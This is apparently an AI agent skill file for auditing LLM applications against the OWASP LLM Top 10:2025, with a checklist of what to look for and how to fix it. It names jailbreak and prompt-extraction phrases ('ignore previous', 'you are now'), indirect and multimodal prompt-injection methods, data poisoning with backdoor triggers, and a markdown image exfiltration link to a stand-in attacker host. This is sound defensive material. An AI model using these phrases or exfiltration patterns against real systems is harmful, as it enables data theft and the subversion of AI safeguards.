---
name: llm-top10
description: Audit an LLM-powered application against the OWASP LLM Top 10:2025. Covers prompt injection, sensitive information disclosure, supply chain, data and model poisoning, improper output handling, excessive agency, system prompt leakage, vector and embedding weaknesses, misinformation, and unbounded consumption. Produces a prioritized findings report with optional fixes.
argument-hint: [scope: full | quick | agents-focused | rag-focused | multimodal-focused | <LLM01-LLM10>]
---

# OWASP LLM Top 10:2025 Audit

You are auditing an LLM-powered application against the OWASP LLM Top 10:2025. Work through each phase in order.

**Scope:** {{args}}


## Phase 1: Interview

Use `AskUserQuestion` for each question below, one at a time.

**Question 1: LLM architecture** (multi-select):
| Option | Description |
|--------|-------------|
| `chat-interface` | User-facing chatbot or assistant |
| `rag` | Retrieval-augmented generation (vector DB, document search) |
| `agents` | Autonomous agents with tools/functions |
| `mcp-tools` | Uses Model Context Protocol servers/tools |
| `multimodal` | Accepts images, audio, video, or PDFs as model input |
| `fine-tuned` | Custom fine-tuned model or LoRA adapter |
| `api-wrapper` | Thin wrapper around a provider API |
| `multi-agent` | Multiple agents that pass messages or share state |

**Question 2: Provider and tooling** - free text:
> Which LLM provider(s), SDK(s), and infrastructure are you using? (e.g. "OpenAI GPT-4o via Vercel AI SDK, Pinecone for RAG, Anthropic MCP servers via stdio")

**Question 3: Scope**
| Option | Description |
|--------|-------------|
| `full` | All 10 categories |
| `quick` | Top 5 most relevant for this architecture |
| `agents-focused` | LLM01, LLM05, LLM06, LLM07, LLM10 (agent-heavy apps) |
| `rag-focused` | LLM01, LLM02, LLM04, LLM08 (RAG-heavy apps) |
| `multimodal-focused` | LLM01, LLM02, LLM05, LLM10 (image/audio/PDF input) |
| `single` | One specific category (user names LLM01-LLM10) |

**Question 4: Output**
| Option | Description |
|--------|-------------|
| `report-only` | Findings report, no code changes |
| `report-and-fix` | Report + implement all Critical and High fixes |
| `fix-critical` | Implement Critical fixes only, skip report |


## Phase 2: Explore

Spawn **4 parallel subagents** to map the LLM surface area before auditing:

| Subagent | Focus |
|----------|-------|
| 1 | System prompts, prompt templates, user input handling, message construction, role separation |
| 2 | Tool/function definitions, agent loops, MCP server config, tool output handling, downstream sinks (HTML render, code exec, SQL, shell, network calls) |
| 3 | Vector DB config, embedding model, retrieval filters, document ingestion, tenant/namespace isolation, fine-tuning datasets |
| 4 | Provider SDK versions and lockfiles, rate limits, token budgets, timeouts, logging/observability, error handling, guardrails |

Each subagent returns a short inventory (file paths, key functions, framework versions). Collect all findings before Phase 3.


## Phase 3: Parallel Audit

Determine the **active category set** from Phase 1 scope:
- `full` - all 10
- `quick` - top 5 highest-risk for the architecture inventory from Phase 2
- `agents-focused` - LLM01, LLM05, LLM06, LLM07, LLM10
- `rag-focused` - LLM01, LLM02, LLM04, LLM08
- `multimodal-focused` - LLM01, LLM02, LLM05, LLM10
- `single` - the one category named by the user

Spawn one subagent per active category. Each reports:

```
CATEGORY: <ID> - <Name>
SEVERITY: Critical | High | Medium | Low | Pass
FINDINGS:
  - <file:line or pattern>: <what is wrong>
FIXES:
  - <specific change needed>
```

---

### LLM01:2025 - Prompt Injection

**Direct injection** - user input overrides system instructions:
- Template string concatenation: `` `${systemPrompt}\n${userInput}` ``, f-strings, `.format()` with raw user input
- Single `messages` array role where system + user content share the same role
- No structural delimiters (XML tags like `<user_input>`, Anthropic-style `<document>`, OpenAI developer/user role separation)
- Known jailbreak patterns not filtered: "ignore previous", "DAN", "developer mode", "system:", "you are now", base64-encoded instructions, leetspeak/unicode obfuscation

**Indirect injection** - untrusted content enters the model context:
- Web search results, scraped pages, emails, support tickets, PDFs, code files, calendar invites, file names
- RAG retrieval results inserted verbatim with no delimiter or "treat as data" framing
- Tool outputs (HTTP responses, shell output, MCP tool responses) appended as assistant or user content without trust labelling
- MCP server tool descriptions and resource contents (servers can rewrite their own descriptions mid-session)

**Multimodal injection** (if `multimodal` selected):
- Images with hidden text/instructions (low-contrast, steganographic, EXIF metadata)
- Audio with prompt-like transcriptions
- PDFs with white-on-white text, embedded JavaScript, or hidden form fields

**Agent injection** (if `agents` or `mcp-tools`):
- Tool call arguments generated from injected content with no validation against the original user request
- Chain-of-thought / reasoning tokens exposed to user and reflected back as input
- No guardrail model or rule check between tool-call decision and execution

**Look in:** prompt template files, message builders (`buildMessages`, `formatPrompt`), RAG context injection, tool result handlers, agent loop code, MCP client wiring, multimodal input preprocessors.

**Fixes:** structural delimiters with input tag stripping, dual-LLM pattern (privileged vs. quarantined), spotlighting/datamarking of untrusted content, tool-call validation against original intent, allowlist of permitted next actions, guardrail/classifier model for high-risk actions, refuse-on-conflict instructions.

---

### LLM02:2025 - Sensitive Information Disclosure

(LLM07 covers the *mechanism* of system-prompt leakage; this category covers *what data* can leak through the model: PII, secrets, other users' data, proprietary content.)

Check for:
- PII, credentials, internal URLs, or business-sensitive data embedded in few-shot examples, retrieved documents, or tool outputs
- No PII redaction/tokenization layer before sending user data to a third-party provider (especially OpenAI/Anthropic/Google with data-retention defaults)
- Model returning data from other users (shared conversation memory, shared cache, shared vector index without tenant filter)
- Error responses surfacing the raw prompt, model name, API key fragments, request IDs, or provider error messages to end users
- Conversation history persisted globally rather than per-user / per-session, or cache keys that lack the user identifier
- RAG / vector search returning documents the requesting user lacks permission to read (no `where user_id = $1` style filter on retrieval)
- Provider data-retention or training-on-data settings left at default (e.g. zero-retention mode not enabled, opt-out of training not set)
- Logs / traces (LangSmith, Helicone, Datadog, CloudWatch, Sentry) capturing full prompts and completions including PII without scrubbing
- Fine-tuning corpus containing memorizable secrets (API keys, customer records) - membership-inference and verbatim-extraction risk
- Embeddings stored with raw source text in metadata, accessible via the same query path

**Look in:** request handlers, prompt construction, RAG retrieval filters, error middleware, logging config, LLM observability SDK init, fine-tuning data prep scripts, provider client config.

**Fixes:** PII redaction proxy (Microsoft Presidio, regex pre-filter) before provider calls, per-user context and cache isolation, authorization filter on every retrieval query, scrub prompts/completions in logs, enable provider zero-retention / no-training flags, redact error messages before returning to client, exclude secrets from fine-tuning data.

---

### LLM03:2025 - Supply Chain

Check for:
- LLM provider SDKs (`openai`, `@anthropic-ai/sdk`, `@google/genai`, `cohere-ai`, `langchain`, `llamaindex`) using broad version ranges (`^`, `~`, `*`) without lockfile integrity verification
- Third-party MCP servers, plugins, or tool packages installed without code review or pinned commit SHA
- Model weights downloaded from HuggingFace / civitai / arbitrary URLs without checksum or signature verification
- Pickle-based model files (`.pkl`, `.bin`, legacy `pytorch_model.bin`) loaded with `torch.load` / `pickle.load` (arbitrary code execution risk - prefer `safetensors`)
- GGUF, ONNX, or LoRA adapter files from untrusted sources loaded into the runtime
- AI gateway or proxy (LiteLLM, Portkey, OpenRouter, Vercel AI Gateway) misconfigured, unauthenticated, or with no provenance log
- No SBOM entry for model artifacts; model version not recorded with deployment
- Outdated model snapshots known to have safety regressions (e.g. deprecated `gpt-3.5-turbo-0301`, unpatched community fine-tunes)
- HuggingFace `trust_remote_code=True` in `from_pretrained` calls
- CI pulls models or datasets fresh from the internet on every build instead of from a verified cache

**Look in:** `package.json` / `pyproject.toml` / `requirements.txt`, lockfiles, `Dockerfile` model download steps, `from_pretrained()` calls, MCP client config files (`mcp.json`, `.mcp.json`, `claude_desktop_config.json`), gateway config, CI workflow files.

**Fixes:** pin SDK versions and verify lockfiles in CI, prefer `safetensors` over pickle formats, checksum/signature-verify all model downloads, pin MCP servers to specific commits and review their tool descriptions, add models to SBOM, set `trust_remote_code=False`, cache verified artifacts in a private registry.

---

### LLM04:2025 - Data and Model Poisoning

Check for:
- Fine-tuning / RLHF / DPO data ingested from user-controlled sources, public scrapes, or community contributions without provenance and review
- Backdoor / trigger-phrase risk: training data not scanned for trigger tokens that activate hidden behaviour
- RAG corpus accepting user uploads, scraped web pages, or shared documents without content moderation
- Embedding ingestion pipeline runs against untrusted content with no quarantine of "high-influence" documents (very high norm, near-duplicate flooding)
- Split-view poisoning: training-time and inference-time documents fetched from URLs that the attacker can later change
- No train/validation/test split integrity check (attacker can poison the eval set to hide regressions)
- Knowledge base does not record document source, ingestion time, and uploader for forensic rollback
- Periodic re-evaluation against a clean golden-set / red-team prompt suite is missing
- No anomaly detection on retrieval frequency (a poisoned doc that suddenly dominates top-k results)

**Look in:** ingestion pipelines, document upload handlers, vector DB seeding scripts, fine-tuning scripts (`trainer.train`, `SFTTrainer`, `accelerate launch`), data loader code, eval harness.

**Fixes:** content moderation and PII scan before ingestion, source allowlisting and signed manifests for training data, store provenance metadata per document, run a fixed red-team eval suite after every ingestion or fine-tune, anomaly detection on retrieval distributions, ability to delete a document and re-index by source.

---

### LLM05:2025 - Improper Output Handling

Treat model output as **untrusted user input** for every downstream sink.

Check for:
- HTML rendering: `dangerouslySetInnerHTML`, `v-html`, `innerHTML`, unescaped Jinja/Handlebars output of LLM text - XSS
- Markdown render: `marked`, `react-markdown`, `markdown-it` without sanitizer / with `html: true` - script injection, image-tag exfiltration via `![](https://attacker/?data=...)`, malicious links
- Code execution: model-generated code passed to `eval`, `exec`, `Function()`, `vm.runInNewContext`, `subprocess`, Jupyter kernels without sandboxing
- SQL: model-generated SQL executed against a real DB without read-only role, parameterization, or query allowlist (NL-to-SQL pattern)
- Shell: model-generated commands passed to `os.system`, `subprocess.run(shell=True)`, `child_process.exec`
- SSRF via generated URLs: model emits a URL, server fetches it without an allowlist / SSRF guard - classic exfil of cloud metadata (`169.254.169.254`), internal services
- Email / messaging: generated content sent without sanitizing for header injection (`\r\n`, CC/BCC fields) or phishing link rewriting
- File paths: generated paths used in `fs.readFile` / `open()` without path-traversal validation (`..`, absolute paths, symlinks)
- Structured output: JSON parsed with `JSON.parse` and trusted blindly - no Zod / Pydantic / JSON-schema validation, no field-type enforcement, no length caps
- Tool calls: tool-call arguments not re-validated against the tool's declared schema before execution
- Missing CSP for pages that render LLM output (no `script-src`, no `img-src`, no `connect-src` restrictions)

**Look in:** UI components that render assistant messages, code-execution sandboxes, NL-to-SQL handlers, agent tool dispatchers, email/notification senders, fetch-by-URL helpers, JSON parsers downstream of LLM calls.

**Fixes:** escape all model output before rendering, sanitize markdown (`DOMPurify`, `bleach`, `rehype-sanitize`), strict CSP, isolated sandbox (Vercel Sandbox, Firecracker, gVisor) for code, read-only DB role + query allowlist for NL-to-SQL, URL allowlist + private-IP blocklist for fetches, schema validation on every structured output, re-validate tool arguments before dispatch.

---

### LLM06:2025 - Excessive Agency

Three sub-risks: **excessive functionality**, **excessive permissions**, **excessive autonomy**.

Check for:
- Tools exposed to the model that the current task does not need (e.g. `delete_user`, `send_email`, `transfer_funds` available for a read-only question-answering flow)
- Tools that wrap broad capabilities (`run_shell`, `query_db`, `http_request`) with no per-call argument allowlist
- Tool credentials run with user-level or admin scope rather than the minimum role for the action
- No human-in-the-loop confirmation before irreversible / high-impact actions: payments, sends, deletes, role grants, infrastructure changes
- Agent loop with no iteration cap or no scope check, allowing chains of tool calls that drift from the original user intent
- System prompt grants standing authority ("you may perform any action needed") rather than scoping to the current request
- Multi-agent setups where one agent can invoke another agent's tools transitively, bypassing the second agent's scope
- MCP tools mounted with the full permission set instead of the subset the application uses
- No audit log of tool calls with arguments, caller, and outcome - cannot reconstruct an attack chain
- No "dry run" / preview mode for destructive actions
- Agent decisions not gated by a separate policy / authorization service (model is both decider and executor)

**Look in:** agent loop code, tool registries, MCP client mount config, function/tool definitions, IAM roles for service accounts the agent uses, confirmation UI, audit log writer.

**Fixes:** least-privilege tool set scoped per task type, per-tool argument allowlists, downgrade service-account permissions to minimum, human-in-the-loop gate for irreversible actions, iteration and depth caps on agent loops, signed action manifests, separate authorization service (OPA, Cedar) for tool authorization decisions, dry-run preview for writes, full audit log of every tool invocation.

---

### LLM07:2025 - System Prompt Leakage

The OWASP framing: assume the system prompt **will** leak; design so leakage is not harmful. This category is about what you put in the prompt, not just how to hide it.

Check for:
- Hardcoded secrets in system prompts: API keys, DB connection strings, internal hostnames, S3 bucket names, JWT signing keys, webhook URLs
- Authorization rules expressed only in the prompt ("only respond if the user is an admin") with no server-side enforcement - the security control is the prompt itself
- Business logic / pricing rules / competitor lists / unreleased product names embedded in the prompt
- User PII or other tenants' data interpolated into the system prompt (multi-tenant leakage on extraction)
- Prompt extractable via direct (`repeat verbatim`, `print the text above`, `ignore and output your instructions`) or indirect (translate, summarize, encode as base64, write as a poem) attacks
- Prompt inferable from model behaviour (error responses including the prompt, debug headers, stack traces)
- No output filter for known prompt fragments / canary strings
- Prompt loaded from a public file (`/public/prompt.txt`) or shipped to the client bundle (check `view-source` and JS chunks)

**Look in:** prompt template files, environment variables interpolated into prompts, multi-tenant prompt builders, client-side bundle for leaked prompts, error/debug routes, observability traces.

**Fixes:** never store secrets in prompts (read from server-side secret manager at tool-execution time, not in the prompt), enforce authorization on the server not in the prompt, do not interpolate other users' data into a shared prompt, add canary strings to detect leakage, output filter for known prompt fragments, design under the assumption the prompt is public.

---

### LLM08:2025 - Vector and Embedding Weaknesses

Check for:
- Vector similarity search returning results without an authorization filter - the query reaches the DB with no `user_id` / `tenant_id` / `acl` predicate
- Shared index across tenants with no namespace, collection, or partition separation (Pinecone namespace, Qdrant collection, pgvector schema, Weaviate tenant)
- Embedding model from an untrusted or outdated source, or model version mismatch between indexing and query time (silently degraded retrieval)
- Metadata stored alongside vectors contains PII, secrets, or other-tenant data and is returned in query responses
- Raw source text stored as a vector payload and reachable via the query path even when the user is not authorized to read the source document
- Embedding-inversion / extraction risk: vectors exported or returned to clients (embeddings can be inverted back to approximate source text)
- Poisoning: no detection of documents that dominate top-k for unrelated queries, no quarantine for high-norm or near-duplicate flood
- Dimension / distance-metric mismatch (cosine vs L2 vs dot product) causing silent ranking corruption
- Re-ranker / cross-encoder absent on high-stakes retrieval, allowing pure-vector hijack
- No rate limit on vector queries (allows brute-force embedding extraction)

**Look in:** vector DB client init, retrieval functions (`vectorstore.similarity_search`, `index.query`, `pg.query` with `<->` / `<=>`), document ingestion pipeline, embedding model config, retrieval filter construction, API routes returning embeddings.

**Fixes:** mandatory per-user / per-tenant filter on every vector query (enforce in a wrapper, not at call sites), namespace or per-tenant collection isolation, allowlist metadata fields returned to the client, never return raw embedding vectors to untrusted callers, version-pin the embedding model and re-index on change, retrieval anomaly detection, cross-encoder re-ranker for high-stakes flows, rate limit on retrieval endpoints.

---

### LLM09:2025 - Misinformation

Covers hallucinations, fabricated citations, and **overreliance** by downstream systems or users.

Check for:
- Model output presented as fact with no source citation, confidence indicator, or "based on retrieved documents" framing
- No retrieval grounding for factual claims (pure-generation answers in a domain that requires sources: medical, legal, financial, regulatory, news)
- Hallucinated citations / URLs / case numbers / API endpoints emitted to users with no verification step (URL existence check, citation back-resolution to the corpus)
- Fabricated package or library names in code suggestions (slopsquatting risk) - no check that suggested imports actually exist in the registry
- No "I don't know" pathway: prompt does not instruct refusal on uncertainty, sampling temperature too high for factual tasks
- Downstream systems treat LLM output as authoritative input with no validation (e.g. LLM-generated metric becomes a business KPI)
- No disclaimer or jurisdiction notice for regulated domains
- No human review gate for high-stakes outputs (clinical decision, legal filing, financial advice, irreversible business action)
- No evaluation of factual accuracy on a held-out benchmark; no monitoring of hallucination rate in production
- Anchoring / sycophancy: prior conversation context biases later answers without correction

**Look in:** RAG citation pipeline, output post-processing, system prompts for hallucination guards, code-suggestion handlers, dashboards or reports that consume LLM output, evaluation harness.

**Fixes:** require citations resolvable to the retrieved corpus, refuse-on-low-confidence prompting + lower temperature for factual tasks, package-existence check for code suggestions, domain disclaimers, human review for high-stakes outputs, hallucination-rate monitoring against a golden set, "show your sources" UI for every factual claim.

---

### LLM10:2025 - Unbounded Consumption

Covers **Denial of Service** and **Denial of Wallet** (DoW) - attacker-driven cost explosion against your provider bill.

Check for:
- No per-user / per-session / per-IP request rate limit on LLM endpoints (Upstash, Vercel rate limit, framework middleware)
- No daily or monthly cost cap and no per-tenant token quota
- Input length unbounded: user can submit a 1MB prompt, paste an entire book, attach huge files
- Output `max_tokens` not set or set to model maximum on every call (attacker forces max output)
- Multimodal: no size limit on uploaded images / audio / PDFs (image tokens scale with resolution, audio with duration)
- Streaming endpoints with no idle timeout - attacker holds connection open consuming a slot
- Recursive / agentic loops with no iteration cap, no depth cap, no wall-clock budget, no cost budget per task
- Tool calls that re-invoke the LLM (e.g. summarization tool, sub-agent tool) without contributing to the parent budget
- Cache poisoning: per-user cache key omits user identifier, attacker fills shared cache; or cache disabled entirely on identical hot prompts
- No timeout on provider HTTP calls (default SDK timeouts can be infinite or very long)
- No alerting on token-spend anomalies, no circuit breaker that disables the endpoint at a spend threshold
- Free / unauthenticated endpoints that proxy to a paid provider model
- Embedding / fine-tuning endpoints (very expensive) with no auth or rate limit
- Model selection controlled by user input (attacker requests the most expensive model)

**Look in:** rate-limit middleware, API route handlers calling provider SDKs, agent loop code, streaming handlers, file upload size limits, provider client config (timeouts, retries), cost-monitoring dashboards, cache key construction.

**Fixes:** per-user token + request rate limits, daily/monthly cost cap with circuit breaker, hard `max_tokens` on every call, truncate input to a known bound, file-size and duration limits on multimodal inputs, agent loop caps (iterations, depth, wall clock, cost), per-request timeouts, anomaly alerts on token spend, authenticate every paid endpoint, server-side model allowlist (not user-controlled), include user ID in cache keys.


## Phase 4: Report

Skip this phase if `fix-critical` was selected in Phase 1 (that option requests fixes only, no report).

Otherwise, generate `security/llm-top10-report.md` (path relative to repo root - create the `security/` directory if missing):

```markdown
# OWASP LLM Top 10:2025 Security Audit

**Date:** <today>
**Architecture:** <from interview>
**Provider / SDK:** <from interview>
**Categories audited:** <list>
**Overall Risk:** Critical | High | Medium | Low

## Summary Table

| ID | Category | Severity | Findings | Status |
|----|----------|----------|----------|--------|
| LLM01 | Prompt Injection | Critical | 3 | Open |
| LLM02 | Sensitive Information Disclosure | ... | N | ... |
| LLM03 | Supply Chain | ... | N | ... |
| LLM04 | Data and Model Poisoning | ... | N | ... |
| LLM05 | Improper Output Handling | ... | N | ... |
| LLM06 | Excessive Agency | ... | N | ... |
| LLM07 | System Prompt Leakage | ... | N | ... |
| LLM08 | Vector and Embedding Weaknesses | ... | N | ... |
| LLM09 | Misinformation | ... | N | ... |
| LLM10 | Unbounded Consumption | ... | N | ... |

## Critical Findings (fix immediately)

### LLM0X-1: <short title>
- **File:** `path/to/file.ts:42`
- **Issue:** <one-sentence description>
- **Evidence:** <code snippet or pattern>
- **Impact:** <what an attacker achieves>
- **Fix:** <specific change>
- **Status:** Open | Fixed in commit `<sha>`

## High Findings (fix before next release)
...

## Medium Findings (fix within 30 days)
...

## Low Findings (track and monitor)
...

## Passing Controls
- LLM0X: <one-line description of what passed and why>

## Remediation Checklist
- [ ] LLM0X-1: ...
- [ ] LLM0X-2: ...

## Out-of-Code Items
Issues that require infrastructure, provider settings, or prompt-engineering work not in the repo:
- [ ] ...
```


## Phase 5: Fix (if `report-and-fix` or `fix-critical` selected)

For each Critical finding (and High findings when `report-and-fix` is selected):
1. Implement the specific fix identified in Phase 3
2. Add a test or assertion that fails without the fix where feasible (regex denylist test, schema-validation unit test, rate-limit integration test)
3. Mark the finding `Fixed in commit <sha>` in the report

Do not change model provider, prompts, or architecture beyond what is needed to address the specific finding. If a finding requires architectural change, leave it Open and add it to **Out-of-Code Items**.


## Completion

Output:
1. The full path to the report file
2. List of every file changed with a one-line description
3. Findings still Open and why (out-of-code, deferred, needs infra change)
4. Any new tests added
